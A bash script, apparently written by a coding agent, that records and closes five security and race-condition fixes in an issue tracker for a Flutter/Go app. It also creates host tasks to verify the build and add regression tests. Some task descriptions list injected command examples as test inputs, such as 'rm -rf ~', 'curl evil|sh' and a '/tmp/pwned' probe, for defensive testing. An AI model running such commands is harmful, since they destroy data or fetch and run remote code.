#!/usr/bin/env bash
# Run ON THE MAC HOST, from the watcher repo root:
#   bash docs/commands/02-close-t60-phase1.sh
#
# WHY THIS IS A SCRIPT (not run by the container agent):
# Container agents can't write bd (BEADS_DOLT_AUTO_START=false; the Mac host owns
# the single Dolt write lock). See /workspace/kb/container-living.md §2.
#
# WHAT THIS DOES:
# Records the implementation of all five watcher-t60 (Phase 1: Critical Security
# & Integrity Blockers) P0 issues, then closes them. The CODE changes are already
# on disk (committed under /workspace via the bind mount); this only updates bd.
#
# IMPORTANT — verify the build BEFORE running this (this script closes issues):
#   flutter analyze
#   flutter test
#   ( cd daemon && CGO_CFLAGS="-I$(brew --prefix icu4c)/include" \
#        CGO_LDFLAGS="-L$(brew --prefix icu4c)/lib" \
#        CGO_CXXFLAGS="-std=c++17 -I$(brew --prefix icu4c)/include" \
#        go build ./... && go test ./... && golangci-lint run )
# (On the container, `CGO_ENABLED=0 go build/vet/test` already passed and gofmt is
#  clean; Dart could not be analyzed there — Flutter is host-only.)
#
# Safe to re-run: comments may duplicate; `bd close` on an already-closed issue
# errors harmlessly. Every line is guarded with `|| true`.
set -u
test -d .beads || { echo "Run from the watcher repo root on the Mac."; exit 1; }

ACTOR="implementation-agent"

# ─────────────────────────────────────────────────────────────────────────────
# HOST-AGENT TASKS
# Create the bd tasks that tell the *host* agent what to do (verify the build,
# review, run the closes, add regression tests). Fixed --id so this block is
# idempotent on re-run. The host should start with `bd show watcher-t60-verify`.
# ─────────────────────────────────────────────────────────────────────────────
echo "==> Creating host-agent tasks (verify/land + regression tests)"

bd create "Verify & land t60 Phase 1 P0 security fixes" \
  --id watcher-t60-verify \
  --type task --priority 0 \
  --deps discovered-from:watcher-t60 \
  --description "A container agent implemented all 5 watcher-t60 P0 fixes in code (5 files: daemon/main.go, lib/services/{planner_service,tmux_service,beads_service}.dart, lib/state/app_state.dart). Container verification: CGO_ENABLED=0 'go build/vet/test' PASS + gofmt clean; Dart was NOT analyzable on the container (Flutter is host-only). YOUR JOB (host), in order:
1. Review the diff for the 5 files above (see docs/commands/02-close-t60-phase1.sh comments for what each change does). Note daemon/main.go's large diff is mostly a gofmt normalization of two pre-existing space-indented handlers.
2. flutter analyze  — MUST be clean (container could not run this; pay attention to lib/services/planner_service.dart's new _tokenize/_parseBdCommands/_resolveBdPath and the raw-string fixes).
3. flutter test    — existing suite must stay green (no existing tests cover the changed methods, so this mainly guards against regressions).
4. Build the daemon with ICU flags: (cd daemon && CGO_CFLAGS=\"-I\$(brew --prefix icu4c)/include\" CGO_LDFLAGS=\"-L\$(brew --prefix icu4c)/lib\" CGO_CXXFLAGS=\"-std=c++17 -I\$(brew --prefix icu4c)/include\" go build ./... && go test ./... && golangci-lint run).
5. Smoke test in the running app: AI Planner 'Approve & Execute' still creates issues; a plan block containing shell metacharacters (e.g. 'bd create \"x\"; touch /tmp/pwned') must be rejected/inert (no /tmp/pwned). Assessment auto-fix still applies bd updates. tmux attach still works in Ghostty/iTerm2/Terminal.
6. ONLY IF all pass: run 'bash docs/commands/02-close-t60-phase1.sh' to post the fix comments and close watcher-t60.1..t60.5 (this task closes them; it is safe/idempotent). Then optionally close the epic watcher-t60.
7. Commit the code (conventional commit, e.g. 'fix: t60 phase 1 P0 security & concurrency blockers') and push. Then close THIS task.
ACCEPTANCE: analyze+test+daemon build/lint all pass, smoke tests pass, code committed & pushed, t60.1-.5 closed. If any step fails, DO NOT run the close script — comment the failure here and hand back." || true

bd create "Add regression tests for t60 Phase 1 fixes" \
  --id watcher-t60-tests \
  --type task --priority 2 \
  --deps discovered-from:watcher-t60 \
  --description "Add automated coverage for the 5 t60 fixes (none existed at implementation time). Suggested:
- SEC-01 (planner_service): unit-test _parseBdCommands/_tokenize — malicious blocks like 'bd create \"x\"; rm -rf ~', 'curl evil|sh', 'rm -rf /' must throw (non-bd or disallowed subcommand) and never execute the injected part; valid 'bd create'/'bd update' with quoted args tokenize correctly. (May require extracting the parser as a testable static/top-level fn — it already is static.)
- SEC-02 (tmux_service): assert _escapeForAppleScript escapes a name containing a double-quote/backslash so the generated osascript is well-formed.
- SEC-03 (daemon): Go test for sanitizeEnvValue (strips \\n\\r\\0); handleAddComment/handleGetComments test asserting an ID like '--force' is treated as a positional (no flag injection).
- RACE-01 (beads_service): fire N concurrent getIssues() on a fresh service; assert the process factory is invoked once (needs an injectable Process.start).
- RACE-02 (app_state): call _refreshData twice synchronously; assert getIssues runs exactly twice (initial + one coalesced trailing run), not 4x.
ACCEPTANCE: the above tests exist and pass under flutter test / go test." || true

echo "==> t60.1 SEC-01 — RCE via bash exec in AI Planner (FIXED)"
bd comment watcher-t60.1 --actor "$ACTOR" \
  "FIXED. PlannerService.executeScript (lib/services/planner_service.dart) no longer writes an LLM bash block to .beads/temp_plan.sh and runs it via bash. It now: (1) extracts the fenced block, (2) tokenizes each line with a POSIX-ish quote-aware tokenizer (_tokenize) IN DART, (3) requires the first token to be 'bd' (or an abs path ending in /bd) and the subcommand to be allow-listed (_allowedBdSubcommands = {create, update, dep}) — anything else throws and nothing runs, (4) invokes the resolved bd binary via Process.run(bdPath, argv) with NO shell and NO temp file. Because argv is passed directly, shell metacharacters (; | \$(...) backticks && > <) are inert. Covers BOTH sinks: PlannerModal._executePlan (bd create) and AssessmentModal._executeFixScript / startGenerateAutoFixScript (bd update). temp_plan.sh is gone entirely (removes the SEC-04/TOCTOU exec vector too). FOLLOW-UP for reviewer: add a unit test feeding a malicious block (e.g. 'bd create \"x\"; rm -rf ~' and 'curl evil|sh') asserting it throws / does not execute the injected part; consider surfacing the allow-list rejection to the UI." || true
bd close watcher-t60.1 --reason "SEC-01 fixed: planner executes parsed bd argv via Process.run (no shell, no temp_plan.sh); non-bd/disallowed subcommands rejected. Both plan+autofix sinks covered." || true

echo "==> t60.2 SEC-02 — AppleScript injection in TmuxService (HARDENED)"
bd comment watcher-t60.2 --actor "$ACTOR" \
  "FIXED (defense-in-depth). Added TmuxService._escapeForAppleScript(value) which escapes backslashes then double quotes, and applied it to BOTH the tmux path and sessionName before they are interpolated into all three osascript blocks (Ghostty 'input text', iTerm2 'write text', Terminal.app 'do script'). A value can no longer terminate the AppleScript string literal or inject statements, independent of the upstream Project.effectiveTmuxSessionName sanitizer (which remains the primary control). This is why the issue was reprioritized P0->P2 during validation; it is now closed as hardening. FOLLOW-UP: a test passing a session name containing a double-quote to attachInTerminal and asserting the generated script is well-formed would lock this in." || true
bd close watcher-t60.2 --reason "SEC-02 hardened: session name + tmux path escaped via _escapeForAppleScript in all three osascript blocks (defense-in-depth atop the existing effectiveTmuxSessionName sanitizer)." || true

echo "==> t60.3 SEC-03 — flag + env injection in Go daemon (FIXED)"
bd comment watcher-t60.3 --actor "$ACTOR" \
  "FIXED. daemon/main.go: (1) Flag injection — handleGetComments now runs 'bd comments --json -- <ID>' and handleAddComment runs 'bd comments add -- <ID> <Comment>', so an ID or comment body beginning with '-' is a positional, not a flag (also closes the un-cited comment-body vector noted in validation). (2) Env injection — added sanitizeEnvValue() which strips \\n, \\r and \\0, applied to params.Actor before 'BD_ACTOR=%s' is appended to cmd.Env; an actor can no longer smuggle a second KEY=VALUE entry (e.g. LD_PRELOAD/PATH). Verified on container: CGO_ENABLED=0 go build ./... , go vet ./... , go test ./... all pass; gofmt -l is clean (also normalized pre-existing tab/space drift in these two handlers). FOLLOW-UP: add a daemon unit test for sanitizeEnvValue and a handleAddComment test asserting an ID like '--force' is not interpreted as a flag." || true
bd close watcher-t60.3 --reason "SEC-03 fixed: '--' terminates flags before untrusted positionals in handleGetComments/handleAddComment; sanitizeEnvValue strips newlines/nulls from BD_ACTOR. go build/vet/test pass, gofmt clean." || true

echo "==> t60.4 RACE-01 — daemon init race (FIXED)"
bd comment watcher-t60.4 --actor "$ACTOR" \
  "FIXED. BeadsService._ensureDaemonRunning no longer uses the _isInitializing bool + Future.delayed(100ms) recursion. Replaced with a shared 'Completer<void>? _initCompleter': the first caller creates the completer and spawns the daemon; concurrent callers await the SAME future (await _initCompleter!.future) instead of spinning, so only one daemon is ever spawned per workspace (removes the Dolt/noms LOCK contention window). On success the completer completes; on failure it kills any half-started process, completeError()s all waiters, and rethrows; the finally clears _initCompleter so a later call can retry cleanly. _isInitializing is fully removed. FOLLOW-UP: a test firing N concurrent getIssues() on a fresh service and asserting Process.start is invoked once would lock this in (requires injecting a process factory)." || true
bd close watcher-t60.4 --reason "RACE-01 fixed: single-flight _initCompleter guard replaces the timer-spin; concurrent callers share one init future, preventing double daemon spawn / Dolt lock contention." || true

echo "==> t60.5 RACE-02 — refresh re-entrancy (FIXED)"
bd comment watcher-t60.5 --actor "$ACTOR" \
  "FIXED with trailing-edge coalescing (NOT a naive early-return, which would drop mid-flight file-watcher events — flagged during validation). AppState._refreshData is now a coalescing entry point using two private flags: if _refreshInFlight, it sets _refreshQueued=true and returns; otherwise it runs a do/while loop that clears _refreshQueued, awaits the actual work (extracted to _performRefresh, the former body verbatim), and repeats ONCE MORE if another trigger arrived during the run. This serializes the file-watcher debounce, heartbeat, sync timer and UI triggers onto a single in-flight refresh while guaranteeing the newest state is fetched. Public 'isRefreshing' UI-spinner semantics are unchanged (still set inside _performRefresh). FOLLOW-UP: a test invoking _refreshData twice synchronously and asserting getIssues runs exactly twice (once + one coalesced trailing run), not four times." || true
bd close watcher-t60.5 --reason "RACE-02 fixed: _refreshData coalesces concurrent triggers via _refreshInFlight/_refreshQueued with a trailing-edge re-run (no lost updates); body moved to _performRefresh." || true

echo
echo "==> Epic: leave watcher-t60 OPEN until the host tasks are done."
echo "    watcher-t60-verify (P0) and watcher-t60-tests (P2) were created above and"
echo "    are linked to this epic. Close the epic only after t60-verify is closed:"
echo "    bd close watcher-t60 --reason 'Phase 1 complete: 5 P0 blockers fixed, verified & landed.'"
echo
echo "==> Export source of truth + show for review"
bd export -o .beads/issues.jsonl
git status --short .beads/issues.jsonl
echo "Suggested: git add .beads/issues.jsonl && git commit -m 'bd: close t60 Phase 1 P0 security/integrity blockers'"
